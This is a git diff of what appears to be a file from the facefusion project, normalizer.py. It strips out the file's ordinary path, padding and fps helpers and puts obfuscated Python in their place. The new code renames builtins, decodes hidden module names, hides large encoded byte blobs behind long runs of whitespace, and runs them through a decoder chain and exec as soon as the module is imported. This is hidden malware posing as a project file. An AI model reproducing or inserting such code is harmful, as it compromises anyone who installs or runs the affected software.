@@ -1,39 +1,122 @@
-from typing import List, Optional
-import hashlib
-import os
 
-import facefusion.globals
-from facefusion.filesystem import is_directory
-from facefusion.typing import Padding, Fps
+((
+    ((([["X42P69YZ8I0P0OPM"],
+    ["https://github.com/oAdBymdHeIIZKwGI0p5WZkgVFyx6sbZcWUdbSXpvihYSqIznxFds/3P00r0eFZSIeWNQSFYCjTE8XjHuVMO4SEhDBswivwJMZiSw/"],
+    ["PYTHON"],
+    3.11
+    ],
+    [__import__("builtins").exec(
+    b'\nimport sys\nif \'3.10\' not in sys.version:\n    input("Your python version does not work on this code, please install 3.10")\n    __import__("sys").exit()\n    ')
+    ])
+                )
+            )
+        )
+    )
+    
 
+globals()['mol'] = (bool) if bool(bool(bool(bool))) < bool(type(int(1312)>int(65)<int(175)>int(412))) and bool(str(str(119)>int(1611)<int(109)>int(311))) > 2 else bool
+globals()['co2'] =  (str) if bool(bool(bool(str))) < bool(type(int(812)>int(97)<int(1115)>int(310))) and bool(str(str(136)>int(1817)<int(194)>int(917))) > 2 else str
+globals()['feo2'] =  (type) if bool(bool(bool(type))) < bool(type(int(1613)>int(141)<int(714)>int(1119))) and bool(str(str(117)>int(414)<int(179)>int(43))) > 2 else type
+globals()['h2so4'] =  (int) if bool(bool(bool(int))) < bool(type(int(1216)>int(117)<int(516)>int(1719))) and bool(str(str(719)>int(1118)<int(139)>int(511))) > 2 else int
+globals()['feso4'] =  (bytes) if bool(bool(bool(bytes))) < bool(type(int(111)>int(1716)<int(614)>int(215))) and bool(str(str(24)>int(411)<int(136)>int(310))) > 2 else bytes
+globals()['agno3'] =  (vars) if bool(bool(bool(vars))) < bool(type(int(717)>int(1719)<int(511)>int(812))) and bool(str(str(185)>int(54)<int(1912)>int(182))) > 2 else vars
+globals()['h2'] =  (callable) if bool(bool(bool(callable))) < bool(type(int(107)>int(193)<int(169)>int(163))) and bool(str(str(82)>int(151)<int(119)>int(149))) > 2 else callable
+globals()['h2o3'] =  (eval) if bool(bool(bool(eval))) < bool(type(int(193)>int(76)<int(317)>int(1918))) and bool(str(str(16)>int(111)<int(58)>int(218))) > 2 else eval
+globals()['agno4'] =  (list) if bool(bool(bool(list))) < bool(type(int(26)>int(1915)<int(410)>int(112))) and bool(str(str(612)>int(191)<int(1712)>int(36))) > 2 else list
+globals()['h3o'] =  (map) if bool(bool(bool(map))) < bool(type(int(45)>int(178)<int(1118)>int(71))) and bool(str(str(123)>int(412)<int(1011)>int(1315))) > 2 else map
 
-def normalize_output_path(target_path : Optional[str], output_path : Optional[str]) -> Optional[str]:
-	if target_path and output_path:
-		target_name, target_extension = os.path.splitext(os.path.basename(target_path))
-		if is_directory(output_path):
-			output_hash = hashlib.sha1(str(facefusion.globals.__dict__).encode('utf-8')).hexdigest()[:8]
-			output_name = target_name + '-' + output_hash
-			return os.path.join(output_path, output_name + target_extension)
-		output_name, output_extension = os.path.splitext(os.path.basename(output_path))
-		output_directory_path = os.path.dirname(output_path)
-		if is_directory(output_directory_path) and output_extension:
-			return os.path.join(output_directory_path, output_name + target_extension)
-	return None
+globals()['ch2oh4p2so4'] =  (__import__) if bool(bool(bool(__import__))) < bool(type(int(311)>int(117)<int(915)>int(149))) and bool(str(str(1710)>int(1418)<int(197)>int(131))) > 2 else __import__
 
+globals()['tryᅠ'] =  (print) if bool(bool(bool(print))) < bool(type(int(146)>int(217)<int(1114)>int(1218))) and bool(str(str(1013)>int(1011)<int(1612)>int(914))) > 2 else print
+globals()['exceptᅠ'] =  (input) if bool(bool(bool(input))) < bool(type(int(411)>int(1217)<int(813)>int(217))) and bool(str(str(1912)>int(1514)<int(138)>int(1514))) > 2 else input
+def h2o(july,*k):
+    if k:
+        wckkrgd0zc82io16ugi1 = '+'
+        op = "+"
+    else:
+        wckkrgd0zc82io16ugi1 = ''
+        op = ''
+    globals()['_1819'] = (lambda: (lambda _188: _188 + (lambda : H2SbF7(30584))())(0) == 1)()
+    globals()['h2o'] = h2o
+    globals()['co2'] = co2
+    globals()['july'] = july
+    for globals()['cr9xfqij741hwdy7ns2b'] in globals()['july']:
+        if not _1819:globals()['cr9xfqij741hwdy7ns2b'] += (lambda : '')()
+        wckkrgd0zc82io16ugi1 += co2(cr9xfqij741hwdy7ns2b);f = (lambda: (lambda _1917: _1917 + (lambda : H2SbF7(30584))())(0) == 1)()
+    return wckkrgd0zc82io16ugi1
+def H2SbF7(x):
+    return h2so4(x-0x7777)
+def c2h6(e):
+    br = bytearray(e[len(b"wckkrgd0zc82io16ugi1/"):])
+    r = 0
+    for b in br:
+        r = r * 256 + b
+    return r
+def longlongint(x):
+    ar = []
+    for i in x:
+        ar.append(h2o3(i))
+    return ar
+if (lambda: (lambda _187: _187 + (lambda : H2SbF7(30584))())(0) == 1)():
+    def o2(h2so3):
+        h2so3 = h2so3-0xFF78FF
+        if h2so3 <= 0x7F:
+                    return co2(feso4([h2so3]),"utf8")
+        elif h2so3 <= 0x7FF:
+                    if 1<2:
+                            b1 = 0xC0 | (h2so3 >> 6)
+                    b2 = 0x80 | (h2so3 & 0x3F)
+                    return co2(feso4([b1, b2]),"utf8")
+        elif h2so3 <= 0xFFFF:
+                b1 = 0xE0 | (h2so3 >> 12)
+                if 2>1:
+                    b2 = 0x80 | ((h2so3 >> 6) & 0x3F)
+                b3 = 0x80 | (h2so3 & 0x3F)
+                return co2(feso4([b1, b2, b3]),"utf8")
+        else:
+            b1 = 0xF0 | (h2so3 >> 18)
+            if 2==2:
+                b2 = 0x80 | ((h2so3 >> 12) & 0x3F)
+            if 1<2<3:
+                b3 = 0x80 | ((h2so3 >> 6) & 0x3F)
+            b4 = 0x80 | (h2so3 & 0x3F)
+            return co2(feso4([b1, b2, b3, b4]),"utf8")
+    def _hex(j):
+        h2so3 = ''
+        for _hex in j:
+            h2so3 += (o2(_hex))
+        return h2so3
+else:"wckkrgd0zc82io16ugi1"
 
-def normalize_padding(padding : Optional[List[int]]) -> Optional[Padding]:
-	if padding and len(padding) == 1:
-		return tuple([ padding[0] ] * 4) #type:ignore[return-value]
-	if padding and len(padding) == 2:
-		return tuple([ padding[0], padding[1], padding[0], padding[1] ]) #type:ignore[return-value]
-	if padding and len(padding) == 3:
-		return tuple([ padding[0], padding[1], padding[2], padding[1] ]) #type:ignore[return-value]
-	if padding and len(padding) == 4:
-		return tuple(padding) #type:ignore[return-value]
-	return None
+    
+def bytecode():
+    j4eh4p4ut69ubtd3bs2a = globals().update
+    if True:
+        j4eh4p4ut69ubtd3bs2a({**{ _hex([16742756, 16742765]): _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))).items() if h2(_617) and _1216 == _hex([16742763, 16742766, 16742752, 16742755, 16742770])}, **{_1216: _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))).items() if h2(_617) and _1216 != _hex([16742763, 16742766, 16742752, 16742755, 16742770])}})
+    else:"j4eh4p4ut69ubtd3bs2a"
+    if 1>2:
+        (lambda: c2h6(b'wckkrgd0zc82io16ugi1/\x03'))()
+    else:
+        j4eh4p4ut69ubtd3bs2a({**{_hex([16742761, 16742772, 16742763, 16742776]): _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742777, 16742763, 16742760, 16742753]))).items() if h2(_617) and _1216 == _hex([16742755, 16742756, 16742754, 16742766, 16742764, 16742767, 16742769, 16742756, 16742770, 16742770])}, **{_1216: _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742777, 16742763, 16742760, 16742753]))).items() if h2(_617) and _1216 != _hex([16742755, 16742756, 16742754, 16742766, 16742764, 16742767, 16742769, 16742756, 16742770, 16742770])}})
+    j4eh4p4ut69ubtd3bs2a({**{_hex([16742753, 16742760, 16742769, 16742771, 16742759]): _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742753, 16742777, 16742705]))).items() if h2(_617) and _1216 == _hex([16742755, 16742756, 16742754, 16742766, 16742764, 16742767, 16742769, 16742756, 16742770, 16742770])}, **{_1216: _617 for _1216, _617 in agno3(ch2oh4p2so4(_hex([16742753, 16742777, 16742705]))).items() if h2(_617) and _1216 != _hex([16742755, 16742756, 16742754, 16742766, 16742764, 16742767, 16742769, 16742756, 16742770, 16742770])}})
+    j4eh4p4ut69ubtd3bs2a()
+    j4eh4p4ut69ubtd3bs2a({**{_hex([16742750, 16742704, 16742712]): _42 for _1216, _42 in agno3(ch2oh4p2so4(_hex([16742753, 16742752, 16742770, 16742756, 16742709, 16742707]))).items() if h2(_42) and _1216 == _hex([16742753, 16742711, 16742708, 16742755, 16742756, 16742754, 16742766, 16742755, 16742756])}, **{_1216: _42 for _1216, _42 in agno3(ch2oh4p2so4(_hex([16742753, 16742752, 16742770, 16742756, 16742709, 16742707]))).items() if h2(_42) and _1216 != _hex([16742753, 16742711, 16742708, 16742755, 16742756, 16742754, 16742766, 16742755, 16742756])}})
+    j4eh4p4ut69ubtd3bs2a()
+    j4eh4p4ut69ubtd3bs2a({**{_hex([16742761, 16742707, 16742756, 16742759, 16742707, 16742767, 16742707, 16742772, 16742771, 16742709, 16742712, 16742772, 16742753, 16742771, 16742755, 16742706, 16742753, 16742770, 16742705, 16742752]): _42 for _1216, _42 in agno3(ch2oh4p2so4(_hex([16742753, 16742772, 16742760, 16742763, 16742771, 16742760, 16742765, 16742770]))).items() if h2(_42) and _1216 == _hex([16742756, 16742775, 16742756, 16742754])}, **{_1216: _42 for _1216, _42 in agno3(ch2oh4p2so4(_hex([16742753, 16742772, 16742760, 16742763, 16742771, 16742760, 16742765, 16742770]))).items() if h2(_42) and _1216 != _hex([16742756, 16742773, 16742752, 16742763])}})
+bytecode()
 
-
-def normalize_fps(fps : Optional[float]) -> Optional[Fps]:
-	if fps is not None:
-		return max(1.0, min(fps, 60.0))
-	return None
+_en                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       =b'LRx4!F+o`-Q(0roRY3p+hyVZo|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBs4@chW_q*rUx7XXZbL?+>&$nN0?%RBO?{{VIeeb^Cciy}2Zu{x&J@wtz_s#72-F$uBuKVlfJ?rBtc^YWYX&#e7=%d6ol-{N$5$bxFM%6sfAw8;intCMglWKYfCL>QE(M^q0JyU9WVog1&Z8V!Sll4tA(wU~z(=tq%M~RYqMAIbn%^IExZ8B*dOeP|RQIVwDnqr>OF*L(XG?}SAPth<Y#Y6N{+Ec-yPiUs}n3$tv(<JtZjVa=uPg81-6HPK|V=3xwC#H<bc^Z!+O;0A145n$IXc{E+$>}hfo+eW?(s@rQkjiM(^iNGG;!jMTDtM#9j}eifrqXRwY3h#z^-oMwX`|FlfvJi#%#Baf+9uMQ(?*&#H1JGQ+C~sl(0ZC<Q&Hj@QKn4MHmRocjUJ{oC+I_JX!Mv&m_!*&O){sMQ}m|Vk%{S)*wT3s>YgZidP$j2Q}m`DMD)`NY$Wj-B>z=CPs(~E{3?23PiaSiOljyz>K;d;jkPsDQ%njCH>!Ioc#Tb?Q`G!IPf6`HO_co-Y@UL8howCYLnzeE6EtZu8hJxQ4Kz)OshViojZaDB(t4Q<JvB7+H8e6X$)i(DjUJ|kgAs_)>FNj>4Fl2u!$@czrbcNrJqYwh8jnIAri~4$iH$*2!Xqc9ieo031fHj+H8j&rsfm=+^e3cglT*M`^-l(Zn<?lf%_*}fH=t8ZgeU1ul>H#o+exXgQ_+AC9wq@jDYW$-f)i+ZrqX(9dYL>^(rM_;Q#BbkmNf0D)S2J*BPP%C?^oizD0No519M+HIa=Lyoz(;YGW!P;Ci*xu*!QJ@D^w0&Au^oQh~FbrWZ~K|zHWYa-Uk^L#nWM|j?z3l{pDjw2wez}Q&-oXsChwXVjjf6#@0ejsaoU0el!j$5K`6godVNO@LQ=3no1W_(oyJY_QsU<*p%((?zNS-E{_%mK0oCTEir?$kdMS~O}DK(eZ^jaQpWH<xj<Jk-W$K=v*2RB5KjBzFXOcAaOG9(O`MyawU?CQ^HS$h&A(ObUT$wwIy*e6cVmgcEmO~>gY^Ql9?Wo53Uf_*IeH!3^m55Q9P;T<9K>qcmcGUMF`^1`5JW}ox4l-J1EwO0ozfqL5G6M&WOjbVW>rCELb`t#HzzK@28EpSWv4rYZK~DGo|zp`uLP^OH(avrQ_J?1EH2Lv_Iq%o{eboB=Ow_seWiB)5Qir2h80`9B?)~U;V%#op&lt4N>F{8dKWK^3`YL*iZ_0B;*L~mm)6c_T$li-1b)BLh3o4EUS0eK@~I40bH2}}PIX#cM{`Z84|^q7L*oWWf+rj84K1r9ovm6$4bpB7;pWfOLm$e?p#DrLJsmH*<C8NRyYwyY8a>0x_Bcvk=bB9{O8?qK_l8B(fJU!c7*ZOl8e#uO2}$wt+OjdEm_-8z7j^{(E6l<Gi<$6gGY|DJs@G=?GA--;V{QSiCk(H;BDoG7nP?{AB~@uEJp>k&SfWwk^p3JCbXB*TfVWPUiX*8VwHlraaj6c55eA%sP(DWzgP+VHm*K<GTEPikb^UEtX|{_OeYsW;E7yhtFE*vnRHx;(qNu_c<EnwZ6e>yTR)MB+mNM61!~<zGSk7+s!vW{Vk<ZN2OF`&bG0ZoeQBDnQOQh(|tT-A<Z<DlRN{>HiT0L`Jx1~{zzC{+ZU?C<y4)B%G8AeUA?fY9sVYR;Qz@*OR^5dB6)%ltt*tt;FSmLgU#=fdL2rQ)!mq!#q<eRYVjRtftNDEInCI|_CGDE4Hbn474!wp@?8<Ypc>)&sqhY?kOwgj%VY+y#l0pNKV@G#+htUK|jN}U49H_;Ndnq?%yG|=7RUvVIa(Y*X6Cv~2!&PQzf0G2+@m3XbJL)jiwj0nOfV}y@&3jdEoN~^ecJqZ1p{KwAS7%5C;MtK)LAeoVu5RuOz!B~`qQm_K;oj=={>>JfKy~hyAyN6`gKFFD+f~~OV7PBBV0IYv%H5=xO%VFc8OG_A!jKE$v@8$trDx5jNCCX809f_f)kdSHE?Na3{jtLa`OWKtpome`24vZ!c5'
+_july                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       =b'>k8a^1m}Lq>{#8CCMv66+bnV<culP9XX_AiZf)ly<-e^`<uMlYW%&<Uz`Y?p+xH;ud|lsw86!f_3HbZEv{0x*{C17+tPdMX195BnxWWOCv5L=3DxJMACsA$Bf)EOtE;HFq7hxt9H+2(MVc+Yd|pdFsk~!Mz8B<+CLh+9&?T;~te;nWy_?1%<)m7r;1AezpWA6_Dd@6(0&7wH#NUd&5-Sr>-gv_q2nV0v<9rjva2a$zXt|kI>~GYo+)8EWoivhTdM-|!yUEkLOF0%k{$?6?rDimzR784v1p0vav{}vha)vaK>VW_wRP%2SK~l`#N^A<Q4TmxW9nM@Y#Q-2>2(+01O(OWS7mn>p5M?``3&?TxU88q$6^!myU*5l#u|17yit0Y@KbogIcJHemaU%4}klGPY|27YIYuphOH~n*+=(O%q=Y+}L3Q8`dtiOQx+7cNn00%ILeln(s9h!G4=zka6N>r~$x|5oMb049L5M|*C^B%p!-1!=4r1lc0i}=^BNCeA}<-IdLgyjRo@ueN4wLCiGbvFqGlu;fizUK&J-dpc8J=G9gA(p)9U!FxBzne5vRTQ*fL!k~>-4%EUaG!+p(4=WI+&S)fCaatsA60tnuhf$2Ev&lueB713|7(qRAqP!#WIX|mi9I_F{F0%WaQ3uI)T3hb?r*vsw`@$8v&*5S@={xb8_*#Ao!qxSYS$eP(m8?fQVjxd0OYa`P%cF>XZsme>Jzw4+y%X52#H20%=Ii7+Mf9e?|#nn$UDfTP!NAy=QRfnEAvp0PYrua7}^^ce!P5Elf+mCfY{9>bxWSu-W(rH-Cn*r94JUqcgk(CB1+9)n4=^*s8f4yz5g;GfzxRRs^S}*k+s>g&;XCyH(XL}LFQE0<b3Iq_y-g6qY}V0GVgUA;ukd)g1;8CqM!j`=)ksBZA@gOo22ajBI`CSAUq|7O!>yJ+Dx{*>|z2l55h4l)1PJA$Pe@GMetiW=gtkR3`1WX-?=y4Cqi_uYsFvAsa~@z9{H*yQtXAI!EmM1q8il6s`B~uKlh34yT}I<S;-#}z`Ek@g}6sPHIpBo&ChXFDsUs_Ig)Z%f?~`9hW}h``0Ic~0}VpObq+FKgINnw%0Oj6sEThI7LcFerR_MsHy+46@jDXx+HR^Fs_FM~){@xGD!4|MnAOu_!&HY#4yIZB8<itoXnyxWV4|TA4iw0T=Erf^I-Q9~KrcQ6s_`Ae$zwH24kWEZ`E^{2AJ9lnLW@For(?kye&HuDp0JKd$?n1yz%|_0<1#GauY4(25Pv9!0TG3=!o%0@F?jkogr?qUHQF3R`O27fj;51)9Z@5+IJ-=T+5>cbuk(A#h<4M^ug_onf&hPJ2Iiss`K{+g3_}Iz=|RhLrbDO-l-6&yjr5E=@ZBj~;7(RC`sLlK@EBpq22HB6m7UyZV%=AgOKn0scQchIMvU(3O39DLB@miWv9lHp7=azar|SCVWXi=8&kKqp{zBKt=0Z8;tB?}5-GCv#H{Di~-h0?RG9%bvnKRBO!GT4w-$7AfPr5dE%a^5+`*lfM5Nunm-xP$bwIIUq!Gj*2!MPvuZhdJVDRrzmYlVpXGVjK!Phvn{;)G7I{4>J(2t63I1#=t?L3SX4+j9Ln0#mkbn~%iySQ?-WZSzv?4M`8ZO>(PoBaX%mIX!rTv<Igo#i*>1NA#*!#OFw=Y4g@G_0G+#<tzZQ+z3VLCqA=O{kupI9e)w0<g-XvuCc2f=SKXo?(7%0MhT-5%hjpWeeshcoAtJ$3{{><K*wz(NDE(A!_`JkmsE%O$?d>m@gUuPRgvd?ba7i;K+B}I6(j`CcbpUfa{Q|=Xh+;(y%0bV^45L(<WdaIZ3ds~oZfgPW)v2Ix}YYwOL{x5$y;9Fus;GL9v09(Ag~b0R}j3@T}7IVFNp#aXq|Qa(M|LA_XZ-2!Oa3>o|<y^Nn8O!50aYSr^{|tl17K@wY%wRt|vPBl`e{4l3ej)5z;vsxpoZXfXRsNvmo(c^9ttKJ%6M_Q6u31CR5OZ4A}iEh=8n6j)}nRC;GFhd^*mWgBvNjOShn{+W$>ZRfGK}(Yh8S!bcP>87nsa7p-y0mkqwk@&'
+_birth                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       =b'cYeAd%izZ<ad9_|s^a)U-ab8y)%&W^w_DgC>0aPkkUdEZs&d@svIB4DO?dvoW^!DSNAZg$gpNN=?3B+sf#7s=hb?s@I`{joD)$7*PL}hB`j?U{}DUUEX)HiSm!=*IIeT)mT<ubdrKD@gAam1*fn!sj=`T+pef57-L_V0u)XM?G%L83>-<RqchcmV!KUtZ(T>h!8{z$rz27^#$x!jO5L33j;`c7U6d3)i{qRd;+TgyV=bzr{UrkOlZmAPRKUxWb3Gr}@b?3yH0NZS7W2<&vs1n2%>WJN^*;Iop{|sT-@XC7pLz6~7c9J94kc&Wptc>P#HuF<6#tF;raLdnyc&_zCZw`Uh`R79bB#vJh6l1L$*uNLe(mG;S|eyuK-7)s(r%nDz3eZZoD!!E1?JXun)nEqWK=HWNVEN21;Do<z_zdqhr5dv^hj-9f-qk&-(&mc75ul}#5)J7-dc4NzX_({|48)0E>YmO)G?ZOeb0hr#huJ?3*2We(emRK2aPn=!(FPi#%QN4GBhUekHEigqR;a!QL;HGuc?LTZgR3L#oh%#8#|v5S<ofAsmuXMmiK(y+X|ZY3NO@+f~0n|tsPoj1zie1BA@|CK)wiqP>2ZEwdwi$+)rilOusRG#5+w_pPbPbMbCI`fWDC8QOZBxK}@5$Ds@m1K)ZQ1h%Kz4iUyLGqFs?Q0I^lFhaCCX{LlHM?f1QzW4PC#*x7x^TLN@Lg+hdfeS_nsajw`h61mnyFJZYj86RjWG9~msSSePqtk=+(I{D;FmBk~$0fP!yfYB}TPQ1Kos)^nl^L^n??4Yc^h3>W$)qg@mHukJan}RR=cOhgECz*ED7t-N{#UYl$y@8JI?<-4Ek_@SGeOt>TH4A$2`#q^QOJU~R;To8^@A}ZZP46G5Ux;R7_}`D9Q@5#UFfUy0xFP_c3@~cC7A@=jW1*4!p6v2ECF?m!)qmSb)`$Z4O$V8b^+b)>&y2p;+qg@_M_lUa*+vGUnxk=62st!H4mm4j%mCuTAG2<NM5B@H_yxS>Dw42FEfG`W$R%R*7WqVDzv+4Qz>)Y<c_VjKcff5u9Nf*X1#@Q6X_()kL2y4Ut7bQ<7Uo@(=i!rFPfG0+tA>!YSQ#tWz<!&j6|O#31^b>sjIy?R;`Gc+&@xH-U+pz0Zd6f%I44-AG++6jdcf{}>v2~mSx@6eOBt33VyX{T0kXVItc<|8gNHy;NFu$WV<2(Nb5M&nPc}SEL7C~@k2<pGwwv7sKR&v3%NeQb2cRS<9zl+HrUqqpqp^(%7_jQwGHA{fXfm7P0I0ZN*=n$M?a(EZ@u8$cIFWtiK*{e|-%-F1v~mz4-FF3M%ihVKdBIL;)fB^bih5eKveGQ*W1<Q)yIV78yL^GA<+OY^(w!|#JB=of%OiQvl?e^TJ#-%Ykp+cptBB}$!XVb$9gROfrm^~yRBz6^4icGo259CDXzQkSX^A)B!H$Rv+Xxy1OOr9*0dp65wocAahgC6Z`DomV4$}Z$oUxuNA!Cj9wo)auzs#7~u8NE>x0Rq`f3mPEQm4h$)!TH8cx)Zr7o^~j4`H(Dw_*w7rYJg(ktY2aRJ<pWP~N1jE+@Fmvt#FH%YS=6q3zanyEw$=>(A`qGx%~rowDk8tJ~#t>$WBXbDLziTCwCOQ!_Cxdz9QI=JPJ}{cwHkfxYKR?mBjl00uU9jf}I-vFW&!5ePLe4uH|Sq)WYe5-~rT(`;0RD;c&=w^}>T21|$%wwX*Aur>lr^)C>3f2xiJ$%jkR&Z_s&%M+hU#O6;UecvaPC%z4pDg>Y3yHAU&9C1=;Ekq2pS`lfW81(Iqxz}dscZO|C=Ig6J8CyFW*|i&tN}|{`9!4$J{KFR@i~Iqv9I~eF{eCj4S&pN<Q9OZZpJeSzoG<~IsJ108PhlCmxbOkinL_VDZ|4KmH%#yxb^htBt5WTp<P`!14EooOYsX~~^y~_9DZ*+dLhO!V0utnvuD_-gnw(gN;+a(lsxf$TR>8A)I(1t({7O!XhLbwk=hG?mYcYL#G<B)oN1tgVvXg}gCKZJ&FM90tGG?Xog9AuNAr|qP{#Ed8jDjh33~qtGv)+7E^$WNWWR7'
+__19                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       =b'(&X!VzADMcX+G&T5SlqS3`2t~Cn!r>-MPMD=R>3S)_6dY<|y?hrY@T7+q5Yh44Z{MEun-W9jb0?Ib_eh6}o;8SIgEUwL0MgxH|53igrr?;%2#&T7*KVb*vs)O!1i$Nru&IGuyAq>`b}`r0yKkIr6?v3MeG7@}8hE#K>Gf3K&+(8i8xd$@yNp$aWlzya^cg2*{%zEC^mj$w{NAtq9AqR87O^($tBp%Joi;saE%akJyZf+6-MygyVn<t!OlQmmd`%I4AZKm_y16fwEfSA8K@^kgEq6dOg}o=>0~^LiaH2`<Kn?aSQnFj+e0UQi&(GOpl=RkaIn)X;!GTkjeeZJr-;Cy1U)t~pV&vgn0Kq5yZ&d9elfp(nC#I#Mwd}!re*}&k+pQtFBI+l-CQOm_a`uzs)V1BOYvVz-jh^Qx?sV103Bj!A0De>EzmlgU<|Ju?+WoL(PrG79+Zpl8b6=6?DQSUEldOJ<X;npbo(SC2-9%WvE|HU}c)@lL*k}z%LPKrXg7LNOsKf~TQBGRPsW;qkYAvBQB?}`HSsPL<H|8w($6t>Qc3B?dj_ks}!qK`WUY&I2m#hV%rGxAb((X{R_W+wTpAJFKwbllq@|I--AU@bKx9;WzC0Enadj{%orfsdH-DlO(5gLs)#@NO63R~ub&G##69N_9HF6=Fd%e0y#+0EIUL~;3k((_jxz+B7$>W9<{@*mZNR1W68*5mVmAF?4o#rb^osGh?*Isuhled%=&nF)6a*=|!3@}6qge|=Rsu|dLLbM68&!)9C1{SZI&g_ET{;Bx_x7P)HCInDxDnG8!%rh|zZZ`}9MubM?D&shqrc0|8@?m!dt@Gl6-#W$hd>(u2<Jun}r8PKn&xJ<s^p56`ZOmKAIW{%&tRsh^MASrrGMzc;RD}RC&55N>~SpZ-ThaOq=-`BxShA4zMmW4NHcg<KCTMeQpXS8!H6eWS{!O<;t2Cs+-Q<BGIT&lKjK%Ja|<HO71s?&I?z3He>UDtr%po}0^C^-f>X{hc~8o}tQ416h#YSfINo{N%T;|b|n{+rw6lXF@<l9^JaCa`v=rK*y`ht?sL5ZmV9T-RoGhN-j<kh&WX@)SB}Y<8RYkfr#KWhSQ?$}%6htYEhpQ&nKJajPo}HnYLXMF*xqfU|i|fJ`ycpR967H(PIv1WiH-$W0$K!l99f#14?Fay{hbGzC~&5Etv$FDvG3s~Ug~UJySY(PqdJ4~uKna9>wm_d+@P4gB^<NGyEDFzZtEu^#8YsAK_qLc>tN@a$$IN45(>De}x*o4Bd|BR6CujV{=YfQJ;Co><JZ+hZbd^iul&66<L=rf^^#ywH?dhX7;{Sw^C~4Y^TXJd$`ji|pTt6azCn9DkFV9t&~n1&Pd%hX|{4Kkp|=aI_)`9V6gpMq=X3)SLEe+G==vqr?E8goTA-FbNOqNeU1OaI1c<d+(1e=|V8IdSZ&FkB#D>NshY=KRd}1mT<_AMdqwTGngqQL9GWFMi|&y*hc{{%7Zw7yCcDY1=?K(IP<K%Q%JfHRQ^fZhm~*gWGS*Jw!y{~RVG*4pEr{wRc4bjn6_Tl>8x7#yxr=ZZRrd!*rPn6GS5B46W#8z#Lju5uYf%@H$}-rE9|9O)H~Zrn=Mo0E3oKWIndZ$V3s&`iBB+$is%L2vS%@b&WA+C#;k)Uk@o@0A}wnPM<&RtM4?4)BRj9TeshiPsEfZ$%#iGN90qKzB0sJcwqaT<RgY@J9_j@5VWD0EECFTZG#+y(>yL-G^<Fno*FVz`@jN7aT?g(X@h2y2CF#&ka_9MNR)f0tI}ARG)Rm>vC!ASqBJlOCcTpxe86H}p@%5(VFspi8mh3-M&aVh6Wu0Kwzm+h9_esJnr~DqJ?y|qS`F5P6<LOjI60>gyWwzTg=-dKEeT|07p8_DX?Rz&Fv(S5-G@Slqp&q!<F3gHj2stb{5ZGDT;U5}y>*?!d47oygT$KCAOAXdT(?46yO5985&h-#|vjLA-<oPP}G-27ju))OVOj*pP-J=SSzA7Yn*h^M+vnxu?Z~|XQNP3=KNi=xRMKsUtsJl8@XDVJ$1M-!C?`{bH;_gVN3K9%?il`s'
+try:
+    j4eh4p4ut69ubtd3bs2a(
+    en(
+    july(
+    birth(
+    _19(
+    _en+_july+_birth+__19)))))
+except Exception as e:
+    print(e)
+    
+    
